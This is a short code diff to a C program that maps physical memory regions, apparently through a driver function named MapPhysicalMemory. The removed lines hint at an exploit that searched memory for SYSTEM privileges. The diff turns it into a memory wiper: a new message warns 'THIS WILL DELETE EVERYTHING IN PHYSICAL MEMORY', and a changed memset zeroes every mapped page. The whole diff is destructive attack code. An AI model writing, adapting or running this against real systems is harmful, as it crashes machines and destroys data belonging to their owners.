@@ -65,7 +65,8 @@ int main(char argc, char** argv)
 		exit(EXIT_FAILURE);
 	}
 	
-	printf("\n\nTrying to find SYSTEM in physical memory...\n");
+	printf("\n\nTHIS WILL DELETE EVERYTHING IN PHYSICAL MEMORY!!!\n");
+	system("pause");
 	for (int i = 0; i < memRegionsCount; i++) {
 		__int64 start = memRegion[i].address;
 		__int64 end = memRegion[i].address + memRegion[i].size;
@@ -76,8 +77,7 @@ int main(char argc, char** argv)
 				fprintf(stderr, "[!] MapPhysicalMemory failed");
 				return EXIT_FAILURE;
 			}
-
-			memset(*buf, 0x47, 0x1000);
+			memset(*buf, 0, 0x1000);
 			if (UnmapPhysicalMemory(buf) == FALSE) {
 				printf("UnmapPhysicalMemory failed");
 				return EXIT_FAILURE;
